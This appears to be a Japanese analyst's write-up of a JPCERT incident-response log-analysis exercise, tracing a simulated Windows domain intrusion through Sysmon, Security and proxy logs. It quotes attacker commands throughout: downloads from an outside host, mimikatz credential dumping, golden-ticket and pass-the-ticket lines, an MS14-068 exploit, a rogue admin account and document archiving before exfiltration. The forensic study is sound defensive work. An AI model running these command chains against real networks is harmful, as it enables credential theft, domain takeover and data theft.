# 1 自分の立ち位置
## (1) 所属及び役割
 - 所属：ある企業の社内情報システム部門
 - 地位・役割：前述のシステム群の管理者

## (2) 目的
  - 社内で発生したインシデントの全体像の調査
  - 影響範囲の特定

## (3) 調査環境について
### ① 調査環境の図
![調査環境図](/env_graph.png)

### ② ホストの情報
![ホストの情報](/host_info.png)

## (4) 使用するもの
### ① 使用する主なログ
イベントログ
- Security.csv（セキュリティログ）
- Sysmon.csv（Sysmonログ）
- TaskScheduler.csv（タスクスケジューラログ)
- Powershell.csv（Powershell実⾏ログ）

### ② 参考資料
* [レポートの書き方](https://www.jpcert.or.jp/research/20171109ac-ir_research2.pdf)
* [ツール分析結果シート](https://jpcertcc.github.io/ToolAnalysisResultSheet_jp/)

# jpcertCTF-1
## 1 状況
### (1) 事象
Win7_64JP_01を使⽤しているユーザからの
以下の問い合わせを受けた。

### (2) 指示
「ウイルス対策ソフトが怪しいファイルを駆除したようなんだが問題がないか確認してほしい。　駆除したファイル名は「`win.exe`」だ」

## 2 調査方法
### (1) 方針
Securityログで通信等アクセスを確認ご、sysmonによるコマンド実行及びPowershellの実行を確認する

### (2) 使用ツール
エクセル

### (3) 調査対象
* `Win7_64JP_01`のイベントログ

## 3 調査
### (1) Securityイベントによる不正通信の調査
#### ① win.exeの実行のセキュリティログの確認
![ネットワークの接続](/ネットワークへの接続1.png)
* 2019/11/07 17:59:59 `win.exe`による198.51.100.101(不審アドレス)への80port通信が確認された。

#### ② win.exeの初めのセキュリティイベント
![first_win_sec1](/win_secログ1.png)
* 2019/11/07 15:44:30 より、管理者共有による`win.exe`の設置を確認
* 送信元が、192.168.16.109(Win7_64JP_09)の`sysg.admin`であることが分かった。
* `sysg.admin`はホスト情報にないユーザ名で、ドメイン内の管理者権限を持っていた。
* 192.168.16.109(Win7_64JP_09)から管理者共有等を用いて横移動されたと考えられる
#### ③ win.exeのタスク登録
![winタスクの登録](/win_タスクの登録.png)
* 2019/11/07 15:49:21　sysg.adminによりタスクスケジューラにwin.exeのタスクがスケジュールされる
* タスクスケジューラを用いて攻撃を行ったことが分かった。

#### ④ 198.51.100.101(不審アドレス)への初めのアクセス
![first_access_win1](/winダウンロード通信1.png)

![first_access_wi](/win_ダウンロード１.png)
* win.exeによる198.51.100.101`notilv.exe`も実行されていた？
![image](https://github.com/user-attachments/assets/0c35c5a6-b27e-4d77-94ff-3583cc1a8f02)
* notilv.exeは、2019/11/07 15:15:03から実行されていた。


### (2) sysmonによる「win.exe」の実行の調査
`win.exe`でfindをかける
#### ① 検査結果
![検査結果](/不審ファイルの実行リスト.png)
* 2019-11-07 15:53:00 より`win.exe`がログに残っていた。
* 初めのログから調べてみる
##### ◇ win.exeの実行時期(初めのログ)
![winの実行](/不審ファイル実行プロセス生成.png)
* 2019-11-07 06:53:00.012 win.exeが実行されていた。
* SYSTEM権限で動作しており、`Win7_64JP_01`は、権限昇格までされていることが分かる
* `taskeng.exe`によって実行されているため、タスクスケジューラを用いて実行していることが分かる。
* ファイルの名前から察するに、権限昇格ができて`win`(勝った)ということでこのようなファイル名なのだと考えられる。
* ファイルパスが、`C:\Intel\Logs\win.exe`であることが分かった。

##### ◇ Pass the Ticketと思われるログ
![pass the ticket](/パスザチケット1.png)
* 2019/11/7  15:58:02 `win.exe`によりPtTと思われるコード実行
```
mz.exe "kerberos::ptt C:\Intel\Logs\500.kirbi" exit"
```
* 引数からmimikatzの実行と考えられる。

##### ◇ Powershellの作成?
![Powershellの実行](/Win_パワーシェルの実行1.png)
* 2019-11-07 16:00:14 ウェブクライアントを使用する`s.ps1`がwin.exeによって作成された。
* ウェブクライアントであるので何かのダウンロードかアップロードようだと考えられる

##### ◇ Win7_64JP_03の管理共有の利用
![不審ファイルの実行1](/不審ファイルの実行１.png)
```
cmd /c "net use \\Win7_64JP_03\c$"
```
* 2019/11/7  16:06:03 Win7_64JP_03の管理共有の利用
* 次に横展開する先と思われる。


### (4) Powershell実行の調査
#### ◇ z.ps1の実行
![zの実行](/zPowershell実行１.png)
* 2019/11/7  15:56:55 z.ps1を実行していた
* `notilv.exe` によって実行されていた。
* `chiyoda.tokyo`ユーザの権限で実行されていた。

#### ◇ notilv.exeによる s.ps1の実行
![](/sPowershell実行.png)
* 2019/11/7  16:03:23 s.ps1が実行された。

### (5) notilv.exeの実行の調査
#### ◇ notilv.exeの自動実行設定(レジストリ)
![自動実行設定](/notilv自動実行設定1.png)

* 2019/11/7  15:53:04 notilv.exeがレジストリの設定により自動実行設定されていた。
```
reg  add hkcu\software\microsoft\windows\currentversion\run /v netshare /f /d C:\Windows\TEMP\notilv.exe /t REG_EXPAND_SZ
```
#### ◇ ファイルの収集
![情報収集1](/notilv情報収集1.png)
* 2019/11/7  15:53:42　各ユーザのドキュメントファイルの収集を行っていた。
```
cmd /c "dir C:\Users\*.doc* /s /o-d > C:\Intel\Logs\g.txt"
```
* EXAMPLE\chiyoda.tokyoの権限であった。
* g.txtに格納された。


* 2019/11/7  15:54:06 各ユーザのエクセルファイルを収集していた
```
 cmd /c "dir C:\Users\*.xls* /s /o-d > C:\Intel\Logs\gg.txt"
```

* gg.txtに保存された.

#### ◇ ネットワークの探索?
* 2019/11/7  15:54:51 から192.168.16.105及び106へのpingが実行されていた

#### ◇ z.ps1の作成
* 2019/11/7  15:56:03 z.ps1が作成された。
```
cmd /c "echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1"
```
* webClientを利用するようだ

#### ◇ z.ps1へのダウンロード先を指定
* 2019/11/7  15:56:28 mz.exeをダウンロードする準備だと思われる。
```
cmd /c "echo $p.DownloadFile("http://anews-web.co/mz.exe", "C:\Intel\Logs\mz.exe") >> C:\Intel\Logs\z.ps1"
```

#### ◇ mz.exeを用いたゴールデンチケットの作成
* 2019/11/7  15:57:28 mz.exeを用いてgoldenチケットを作成または、使用した
* exsample.co.jpドメインのsysg.adminユーザのゴールデンチケットが使用または、作成された。

```
cmd /c "C:\Intel\Logs\mz.exe "kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi" exit"
```

#### ◇ Win7_64JP_03の管理共有の利用
* 2019/11/7  15:59:37 Win7_64JP_03の管理共有の利用

```
cmd /c "net use \\Win7_64JP_03\c$"
```

#### ◇ s.ps1の作成、実行
* 2019/11/7  16:01:14 s.ps1が作成された。
```
cmd /c "echo $p.DownloadFile("http://anews-web.co/server.exe", "C:\Intel\Logs\server.exe") >> C:\Intel\Logs\s.ps1"
```
* s.ps1は、ウェブサイトから`server.exe`をダウンロードするスクリプトのようだ。

* 2019/11/7  16:03:23 s.ps1が実行された。
#### ◇ Win7_64JP_03へのserver.exeの設置
* 2019/11/7  16:03:41 管理者共有を用いたWin7_64JP_03へのserver.exeの設置
```
cmd /c "copy C:\Intel\Logs\server.exe \\Win7_64JP_03\c$\Intel\Logs\server.exe"
```

#### ◇ わからんコマンドの実行
* 2019/11/7  16:09:09

```
cmd /c "klist purge"
```

#### ◇ mz.exeによるPtT
* 2019/11/7  16:09:37 mz.exeによるPtT
```
cmd /c "C:\Intel\Logs\mz.exe "kerberos::ptt C:\Intel\Logs\500.kirbi" exit"
```

#### ◇ 2回目のWin7_64JP_03の使用
* 2019/11/7  16:09:55 2回目のWin7_64JP_03の使用
```
cmd /c "net use \\Win7_64JP_03\c$"
```

#### ◇ 2回目のWin7_64JP_03へのserver.exeの設置
* 2019/11/7  16:10:13 2回目のWin7_64JP_03へのserver.exeの設置
```
cmd /c "copy C:\Intel\Logs\server.exe \\Win7_64JP_03\c$\Intel\Logs\server.exe"
```
* ２回目なので1回目は失敗したと考えられる
* PtTによって得たチケットの権限で実行できるようになったと思われる。

#### ◇ z.batの実行
* 2019/11/7  16:12:53 z.batの実行
```
cmd /c "C:\Intel\Logs\z.bat"
```

##### z.batによるWin7_64JP_03でのserver.exeの実行
* 2019/11/7  16:12:53 z.batによるWin7_64JP_03でのserver.exeのタスクスケジュール
```
at.exe  \\Win7_64JP_03 16:17 cmd /c "C:\Intel\Logs\server.exe"
```
* atコマンドを利用しているのでタスクが`16:17`スケジュールされたと分かる

## 
198.51.100.101
不審WEBサーバ
(anews-web.co)

# 2 ハンズオン２
## (1) 侵害範囲の調査
### ① 方針
* sysmonより、Win7_64JP_01侵害時刻(15:44:30)近くのログを調べる
### ② 実行
#### ◇ Win7_64JP_01への侵害
![](/横展開１.png)
* 2019/11/7  15:49:21 Win7_64JP_01への侵害
* `EXAMPLE\maebashi.gunma`ユーザにより実行されている
* q.batの中のコマンドのようだ
* 次に`maebashi.gunma`ユーザ及び`q.bat`の実行を追う
#### ◇ dwm.exeによるq.batの実行
![](/qバッチ実行.png)
* 2019/11/7  15:49:21 dwm.exeによってq.batが実行されていた。
* dwm.exeについて追跡する

#### 192.168.16.1(AD)への侵害
![](/ADへの侵害1.png)
* 2019/11/7  15:31:02 ADに対する管理者共有の利用(Jドライブというネットワークドライブとして割り当てた)

![](/mzのAD設置.png)
* 2019/11/7  15:31:17 Jドライブに`mz.exe`の設置

## (2) 感染したマルウェアの特定
### ① 方針
* dwm.exeの作成について追跡をする

### ② 実行
#### dwm.exeのダウンロード
![](/マルウェアのダウンロード.png)
* 2019/11/7  15:16:53 maebashi.gunmaユーザにより、`http://news-landsbbc.co/upload/`から21.jpgを`dwm.exeとしてダウンロードしていた。


## (3) 漏洩した情報の特定
### ① 方針
* dwm.exeの実行を追跡する
#### ② Win7_64JP_01の情報の奪取
1[](/情報の奪取1.png)
* 2019/11/7  16:58:37 Win7_64JP_01の情報の奪取

```
cmd /c "C:\Intel\Logs\rar.exe a -r -ed 
-v300m -taistoleit C:\Intel\Logs\d.rar 
"\\Win7_64JP_01\c$\Users\chiyoda.tokyo.
EXAMPLE\Documents" 
-n*.docx -n*.pptx -n*.txt -n*.xlsx"
```

* rarを用いてアーカイブしている。
* -n*.docx -n*.pptx -n*.txt -n*.xlsxが奪取された。
* この後、logは、削除されていた。


### (4) 攻撃者のコマンド実行痕跡
#### ◇ dwm.exeの実行をgrepで調べる
```
cat Sysmon.csv | grep dwm.exe -B 15 | grep -e CommandLine -e UtcTime: | grep -v ParentCommandLine >  dwm_cmd_log
```
![](/攻撃者のコマンド実行１.png)
* 2019-11-16 17:22:51 z.ps1の実行
 	- `"http://anews-web.co/`からmz.exeをダウンロードするシェル

* 2019-11-16 17:25:43 p.ps1の実行  
	- `http://anews-web.co/`からrar.exe,ms14068.rarをダウンロードするシェルのようだ

### (5) 追加された機能
さっきのやつ

# 3 ハンズオン3
## (1) 感染したマルウェアのC2とみられる通信先ドメイン名

### ① 方針
* 感染端末(Win7_64JP_09)のログに絞り、分析を行う

### ② 実行
#### ◇ p.ps1等のコマンド実行時を調べる
```
cat access.log | cut -d" " -f 1,4-10 | grep 192.168.16.109 | grep -E '07/Nov/2019:17:21:'
```
![](/C２通信1.png)
* どちらも同じ`http://biosnews.info/index.php?fn=s1&uid=1995ebcfd6e929e661c90bdb0d00c1fa`に対するGETコマンドが実行されている!!

#### ◇ biosnews.infoへの通信を調べる
初めの通信あたりを確認する
```
cat access.log | cut -d" " -f 1,4-10 | grep 192.168.16.109 | grep biosnews.info | head -n 20
```
![](/C2通信2.png)

* マルウェアがダウンロードされたすぐに通信が始まっていた。
* funcパラメータで実行するめいれいが違うようだ。
* PUTが利用されていたのでデータや回収した情報等が送信できると考えられる



### (2) 他端末による不正な通信
#### ① 方針
* 先程見つかったC2サーバと通信を行っているIPを見つける

#### ② 実行
かん違いでしたぁ
192.168.16.101だったよ

# 4 ハンズオン4
## (1) 管理者権限の割り当て
### ① 方針
* Administratorsに所属しているはずなのでこれを調べる
* ドメインユーザであれば"Domain Admins"に所属するのでこれを調べる

### ② 実行
#### ◇ Domain Adminsのメンバーの特定
```
cat Security.csv | grep "Domain Admins" -B 6
```
![](/管理者ユーザ１.png)

* EXAMPLE\machida.kanagawa
* EXAMPLE\maebashi.gunma

#### ◇ Administratorsのメンバーの特定
```
 cat Security.csv | grep Administrator -A 1 | grep アカウント名: | sort | uniq
 ```
 ![](/管理者ユーザ２.png)
 * sysg.admin
 * Administrator

## (2) sysgadminによってログインされた端末
### ① 方針
* Securityよりsysgadminの情報を確認する
* 初期侵入後の時間以降を確認する
* PtTやゴールデンチケット攻撃を行っていたのでKerberos サービス チケットの操作を焦点にして、探す

### ② 実行
#### ◇ 検索方法
![](/kensa1.png)
1. 日時で絞る
2. 成功の監査で絞る
3. 「`Kerberos`」で絞る
4. `sysg.admin`で絞り、サービス名または、クライアントアドレスを抜き取る

```
cat Security.csv | \
grep -E "2019/11/07 1[5-8]" -A 16 |\   
grep "成功の監査" -A 13 |\
grep -A 13 "Kerberos サービス チケットが要求されました" |\
grep -A 10  sysg.admin |\
grep -e "サービス名" -e "クライアント アドレス" |\
sort | uniq
```
![](/Domain_ATK1.png)
以下が侵害されたと分かる
* 192.168.16.101
* 192.168.16.103
* 192.168.16.104
* 192.168.16.109

## (3) 不正ログオンに使用したツール名、攻撃手法
### ① これまで、得た情報から考える
#### ◇ mz.exeについて
```
mz.exe "kerberos::ptt C:\Intel\Logs\500.kirbi" exit"
```

* `kerberos::ptt`このオプションは、mimikatzで利用される「パスザチケット攻撃」のモジュールだ。
* そのためこのmz.exeは、`mimikatz`であると考えられる
* また、利用された手法は、Kerberosチケットを利用不正利用するパスザチケット攻撃だと考えられる。
* `.kirbi`は、ケルベロスチケットの拡張子である

#### ◇ mz.exeによる永続化
```
cmd /c "C:\Intel\Logs\mz.exe "kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi" exit"
```
* `kerberos::golden`は、mimikatzのゴールデンチケット攻撃用のモジュールである。
* `500.kirbi`がゴールデンチケットとして作成されている。
* パスザチケット攻撃は、`Win7_64JP_01`上では、実行されていた。

#### ◇ 注意点
mimikatzは通常、mimikatz内のシェルで実行するようにして、引数による判断をできないので、通常Securityログ等のlassやkerberos等へのアクセスのログから判断できるようになる必要がある。

## (4) 不正なユーザ追加
### ① 方針
* DCのセキュリティログより、利用されたアカウント名を列挙する
* 既知のアカウント出ないアカウントについて調べ作成時刻等を探る。

### ② 実行
#### ◇ 利用されたアカウント名を列挙する

```
cat Security.csv | grep -E "2019/11/07 1[5-8]" -A 16 | grep "成功の監査" -A 13 | grep アカウント名: | sort | uniq
```
![](/used_account1.png)
アカウント名のみ見てみる
![](/used_account2.png)
既知のユーザでない「`machida.kanagawa`」アカウントを発見した

#### ◇ machida.kanagawaについて調べる
machida.kanagawaの作成時期を見る
![](/machida_create1.png)
* 2019/11/07 15:29:37 machida.kanagawaユーザの追加
* maebashi.gunmaユーザによって作成されていた。

## (5) 権限昇格の手法の特定
### ① 方針
* machida.kanagawaユーザのセキュリティログを追う
* machida.kanagawaユーザの実行を探る
* jpcertの出しているツール判断基準を用いて権限昇格で用いられたツールを探す

### ② 実行
#### ◇ Domain Adminsのメンバーになる
![](/machida_esc1.png)
* 2019/11/07 15:29:58 machida.kanagawaユーザは、Domain Adminsのグループメンバーに追加されていた。


#### ◇ 192.168.16.109からのmachida.kanagawaへのログイン
![](/machida_login1.png)
* 2019/11/07 15:31:01 192.168.16.109(WIN10_64JP_09)へのログインの確認

#### ◇ Anonymous LogonのACLをもらう
![](/machida_anonymous1.png)
* 2019/11/07 16:04:00 machida.kanagawaにAnonymous LogonのACLが作成されていた。
* 永続化をスムーズに行うためだと思われる

#### ◇ machidaのmachida.kanagawa作成前のログを見る
![](/esc2.png)
* 2019-11-07 15:26:37.548 ms14-068の脆弱性を利用していた。
* これによって権限昇格した。


## (8) マルウェアの実行の調査
メールに添付されていた「Interview.doc.lnk」を開いたことがユーザへの事情聴衆で分かった。
### ① 方針
* Interview.doc.lnk作成のPIDを調べたのち、そのPIDで検索をかけ、実行の信憑性を確認する

### ② 実施
```
cat Sysmon.csv | grep "Interview.doc.lnk" -B 5

cat Sysmon.csv | grep "ProcessId: 2144" -B 14 -A 2 | grep -e "TargetFilename:" -e "情報" -e "User:" 
-e "CommandLine:" -e "ProcessId: 2144"
```
![](/mal_dwn_exec1.png)
* 2019/11/07 15:16:03 `maebashi.gunma`ユーザの`C:\\Windows\\Explorer.EXE`プロセスによって`thunderbird`(メールソフト)が実行されている。
* 2019/11/07 15:16:45 `Interview.doc.lnk`が作成される
* ,2019/11/07 15:16:53 マルウェアのダウンロードが実行される。
* メールソフトの起動、`Interview.doc.lnk`の作成後、少しして`maebashi.gunma`ユーザの`C:\\Windows\\Explorer.EXE`プロセスによってマルウェアのインストールコマンドが実行されている。
* `maebashi.gunma`ユーザの`C:\\Windows\\Explorer.EXE`プロセスは、ローカルログインした場合、このプロセスによって動くため、ユーザによって報告された内容は信憑性が高い。

# 5 事後調査
## (1) 情報流出の有無
### ① 方針
* 情報が収集されその情報がまとめられていたのを確認している。
* 情報が収集された近辺で、プロキシのログでファイルサイズの大きい通信等がないか調べる

### ② 実行
#### ◇ 前回の情報の確認
1[](/情報の奪取1.png)
* 2019/11/7  16:58:37 Win7_64JP_01の情報の奪取

```
cmd /c "C:\Intel\Logs\rar.exe a -r -ed 
-v300m -taistoleit C:\Intel\Logs\d.rar 
"\\Win7_64JP_01\c$\Users\chiyoda.tokyo.
EXAMPLE\Documents" 
-n*.docx -n*.pptx -n*.txt -n*.xlsx"
```

* rarを用いてアーカイブしている。
* -n*.docx -n*.pptx -n*.txt -n*.xlsxが奪取された。
* この後、logは、削除されていた。

#### ◇ 実行時付近を調べる
```
cat access.log | cut -d" " -f 1,4-10 | grep 192.168.16.109 | grep -E '07/Nov/2019:(16:5[8-9]|17:0)' | grep POST
```
![](/file_steal1.png)
* 07/Nov/2019:17:00:46 `biosnews.info`に対するファイル送信と思われるログ
* 07/Nov/2019:16:58:37 このログは、アーカイビング時のログだと思われる。
* `item=1995ebcfd6e929e661c90bdb0d00c1fa`とあるのでこれが、取得したものを表している名前的なものだと考えられる。
* `334`はhttpレスポンスのサイズであるため、どのくらいのサイズの情報が送信されたかは、不明

#### ◇ biosnews.infoのPOSTの全体のログを見る
```
cat access.log | cut -d" " -f 1,4-10 | grep biosnews | grep -E '07/Nov/2019:' | grep POST
```
![](/file_steal2.png)
* 最後のPOSTのみ`item`クエリフィールドが利用されていた。
#### ◇ 推測
* 07/Nov/2019:17:00:46 収集されたファイルは、`biosnews.info`に送信された。

### ③ 参考資料
プロキシの`access.log`の設定:https://software.fujitsu.com/jp/manual/manualfiles/M060001/J2S19730/01Z2A/ifpxyaa/ifpxy138.html

### (7) dwm.exeの動き
もうちょっと見やすくする
```
cat Sysmon.csv | grep dwm.exe -B 16 | grep -e CommandLine -e "ProcessCreate"  | grep -v ParentCommandLine | sed "s/情報/\n/g" > dwm_cmd_log
```
#### ① 初期侵入時の内部偵察
1. コマンドプロンプトの起動
```
2019/11/07 15:17:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: c:\windows\system32\cmd.exe  
```
2. 起動プロセスの確認
```
2019/11/07 15:18:40,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""tasklist""      
```
3. 権限の確認
```
2019/11/07 15:20:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""whoami /all""    (権限の確認)
```

4. AD情報の列挙
```
2019/11/07 15:21:15,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\csvde.exe -f C:\Intel\Logs\l.txt""
```

#### ② mimikatzのダウンロード
z.ps1を用いてmimikatzと思われる`mz.exe`のダウンロードが実行された
```

2019/11/07 15:22:00,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\z.ps1""

2019/11/07 15:22:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/mz.exe"", ""C:\Intel\Logs\mz.exe"") >> C:\Intel\Logs\z.ps1""

2019/11/07 15:22:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\z.ps1""

```

#### ③ mimikatzによるクリアテキストのログオンパスワードの奪取
sekurlsa::logonpasswordsモジュールが利用されており、ユーザのログオンパスワードがクリアテキストで保存されている可能性をついたようだ
```
2019/11/07 15:23:54,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" exit > C:\Intel\Logs\c.txt""
```

#### ④　p.ps1によるrar.exe及びms14068.rarアーカイブのダウンロード
```
,2019/11/07 15:25:43,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""powershell -ExecutionPolicy ByPass -File C:\Intel\Logs\p.ps1""

,2019/11/07 15:25:19,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/ms14068.rar"", ""C:\Intel\Logs\ms14068.rar"") >> C:\Intel\Logs\p.ps1""

,2019/11/07 15:24:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""echo $p.DownloadFile(""http://anews-web.co/rar.exe"", ""C:\Intel\Logs\rar.exe"") >> C:\Intel\Logs\p.ps1""

,2019/11/07 15:24:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""echo $p = New-Object System.Net.WebClient > C:\Intel\Logs\p.ps1"
```

#### ⑤ MS14-068を用いた権限昇格
```
2019/11/07 15:26:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\ms14068\ms14-068.exe -u maebashi.gunma@example.co.jp -s S-1-5-21-1524084746-3249201829-3114449661-1127 -d win-wfbhibe5gxz -p p@ssw0rd""
```

#### ⑥ TGTチケットの回収
maebashi.gunmaのTGTチケットを取り出し回収した
```
2019/11/07 15:27:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptc TGT_maebashi.gunma@example.co.jp.ccache"" exit > C:\Intel\Logs\m.txt""
```

#### ⑦　machida.kanagawaユーザの作成とドメインユーザへの加入
```
2019/11/07 15:29:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""net user machida.kanagawa h4ckp@ss /add /domain""

2019/11/07 15:29:58,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""net groups ""Domain Admins"" machida.kanagawa /add /domain""
```

#### ⑧ DCに対するmimikatzの実行
1. 管理者共有によるDCへの接続(Jドライブとして割り当てられた)
```
2019/11/07 15:31:02,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""net use j: \\192.168.16.1\c$ h4ckp@ss /user:example.co.jp\machida.kanagawa""
```
2. mz.exe(mimikatz)のDCへの設置
```
2019/11/07 15:31:17,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""copy C:\Intel\Logs\mz.exe J:\Windows\Temp\mz.exe""
```
3. b.batの実行(mimikatzの実行)
```
2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\b.bat""
```
* b.batの中身(DC上でのmimikatzのlsaダンプ実行)
```
cat Sysmon.csv | grep "b.bat" -B 16 | grep -e CommandLine -e 情報 | grep -v ParentCommandLine | sed "s/情報,/\n/g"
```

```
2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: at.exe  \\win-wfbhibe5gxz 15:37 cmd /c ""C:\Windows\Temp\mz.exe ""privilege::debug"" ""lsadump::lsa /inject /name:krbtgt"" exit > C:\Windows\Temp\o.txt""

2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1  

2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\b.bat""
```
4. lsaダンプの回収
```
,2019/11/07 15:37:59,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""copy J:\Windows\Temp\o.txt C:\Intel\Logs\o.txt""
```

#### ⑧ ゴールデンチケットの作成
```
,2019/11/07 15:38:26,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::golden /domain:example.co.jp /sid:S-1-5-21-1524084746-3249201829-3114449661 /rc4:b23a3443a12bf736973741f65ddcbc83 /user:sysg.admin /id:500 /ticket:C:\Intel\Logs\500.kirbi"" exit""
```

#### ⑨ PtTとファイル収集、ユーザの削除
1. Pass the Ticketの実行
```
,2019/11/07 15:39:27,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\mz.exe ""kerberos::ptt C:\Intel\Logs\500.kirbi"" exit""
```
2. ドキュメントファイル等の収集
```
2019/11/07 15:39:57,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""dir C:\Users\*.doc* /s /o-d > C:\Intel\Logs\r.txt""
```
3. machida.kanagawaの削除
```
,2019/11/07 15:40:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""net user machida.kanagawa /delete"
```

#### ⑩ ネットワークの偵察
```
,2019/11/07 15:42:14,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""ping 192.168.16.103""

,2019/11/07 15:41:24,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""ping 192.168.16.101""

,2019/11/07 15:41:42,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""ping 192.168.16.102""

,2019/11/07 15:42:35,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""ping 192.168.16.104""
```
#### ⑪ Win7_64JP_01への侵害
1. Win7_64JP_01の管理共有によるwin.exeの設置
```
,2019/11/07 15:44:30,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""copy C:\Intel\Logs\win.exe \\Win7_64JP_01\c$\Intel\Logs\win.exe""
```

2. q.batの実行(mz.exeの実行)
```
,2019/11/07 15:49:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\q.bat""
```
* q.batの中身
```
cat Sysmon.csv | grep "q.bat" -B 16 | grep -e CommandLine -e 情報 | grep -v ParentCommandLine | sed "s/情報,/\n/g"
```
```
2019/11/07 15:49:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: at.exe  \\Win7_64JP_01 15:53 cmd /c ""C:\Intel\Logs\win.exe""

2019/11/07 15:49:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1  

2019/11/07 15:49:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\q.bat""
```

####  ⑫ ファイルの回収と撤収
1. Win7_64JP_01のドキュメントファイルを回収
```
,2019/11/07 16:54:51,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""dir \\Win7_64JP_01\c$\Users\chiyoda.tokyo.EXAMPLE\*.doc* /s /o-d > C:\Intel\Logs\k.txt""

,2019/11/07 16:56:28,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""type C:\Intel\Logs\k.txt""
```
2. 情報のアーカイビング
```
,2019/11/07 16:58:37,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""C:\Intel\Logs\rar.exe a -r -ed -v300m -taistoleit C:\Intel\Logs\d.rar ""\\Win7_64JP_01\c$\Users\chiyoda.tokyo.EXAMPLE\Documents"" -n*.docx -n*.pptx -n*.txt -n*.xlsx""
```
3. 攻撃者作業フォルダの削除
```
,2019/11/07 17:01:49,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
CommandLine: cmd /c ""del C:\Intel\Logs\*""
```
